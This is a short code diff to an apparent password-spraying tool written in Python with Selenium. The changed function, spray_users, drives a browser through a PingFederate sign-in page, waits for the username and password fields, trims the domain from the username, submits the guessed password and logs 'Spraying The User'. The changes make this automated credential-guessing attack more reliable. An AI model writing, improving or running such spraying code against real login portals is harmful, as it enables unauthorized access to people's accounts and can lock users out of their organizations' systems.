@@ -46,12 +46,14 @@ def spray_users(username, password, output_file, incognito, headless):
         print(f'[*] Waiting for PingFederate redirect...')
         try:
             pf_username_input = wait.until(
-                EC.presence_of_element_located((By.ID, "username"))
+                EC.element_to_be_clickable((By.ID, "username"))
             )
             pf_username_input.clear()
-            pf_username_input.send_keys(username)
+            pf_username_input.send_keys(username.split("@")[0])
 
-            pf_password_input = driver.find_element(By.ID, "password")
+            pf_password_input = wait.until(
+                EC.element_to_be_clickable((By.ID, "password"))
+            )
             pf_password_input.send_keys(password)
             print(f'[*] Spraying The User : {username} !')
             time.sleep(1)
